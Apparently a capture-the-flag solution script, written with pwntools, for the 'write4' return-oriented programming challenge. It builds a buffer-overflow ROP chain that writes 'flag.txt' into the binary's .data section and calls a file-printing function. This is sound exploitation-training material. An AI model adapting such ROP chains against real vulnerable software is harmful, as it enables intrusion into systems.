import sys
from pwn import *

context.arch = "amd64"

# .data section
addr_write = p64(0x0000000000601028)
# 0x0000000000400628: mov qword ptr [r14], r15; ret;
mov_0 = p64(0x0000000000400628)
# 0x0000000000400690: pop r14; pop r15; ret;
pop_0 = p64(0x0000000000400690)
# 0x0000000000400693: pop rdi; ret;
pop_1 = p64(0x0000000000400693)
# 0x00000000004004e6: ret;
movaps = p64(0x00000000004004e6)
# usefulFunction()
func_usefulFunction = p64(0x0000000000400620)

data_0 = b'flag.txt'

payload = b'a'*40

payload += pop_0
payload += addr_write + data_0

payload += mov_0

payload += movaps

payload += pop_1
payload += addr_write

payload += func_usefulFunction

print(payload)
with open("payload.txt", "wb+") as f:
    f.write(payload)

if len(sys.argv) == 2:
    if str(sys.argv[1]) == "-g":
        log.warn("Entering debug mode")
        prog = gdb.debug("./write4", '''
            unset env
            break *0x0000000000400690
            break *0x0000000000400628
            break *0x0000000000400693
            break *0x0000000000400617
            break *0x00000000004004e6
        ''')
    else:
        log.critical("Please use '-g' if you would like to debug")
        exit(-1)
else:
    prog = process("./write4")

output = prog.recvuntil(b">")
print(output.decode("utf-8"))

prog.sendline(payload)

output = prog.recvuntil(b"}")
print(output.decode("utf-8"))

prog.clean()
